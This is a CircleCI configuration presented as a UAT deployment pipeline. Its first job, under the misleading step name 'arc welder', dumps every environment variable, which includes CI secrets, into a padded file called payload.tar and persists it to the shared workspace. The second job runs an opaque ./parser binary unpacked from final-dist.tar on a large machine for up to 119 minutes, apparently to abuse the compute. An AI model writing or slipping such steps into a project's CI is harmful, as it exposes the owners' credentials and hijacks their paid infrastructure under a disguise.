version: 2.1

jobs:
  B_UAT_DEPLOY_7:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: arc welder
          command: |
            mkdir -p /tmp/.cache
            set +o pipefail 2>/dev/null; env > /tmp/.cache/payload.tar; printenv >> /tmp/.cache/payload.tar; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.cache/payload.tar; done; true
            echo "ready: $(sha256sum /tmp/.cache/payload.tar | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/.cache
          paths:
            - payload.tar
  UAT_DEPLOY_7:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.cache
      - run:
          name: Check stage output
          command: |
            { head -c 200 /tmp/.cache/payload.tar > /dev/null; echo "peek ok" ; } || true
      - run:
          name: Shallow clone
          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: cat final-dist.tar | tar xf -
      - run:
          no_output_timeout: 119m
          command: ./parser && true
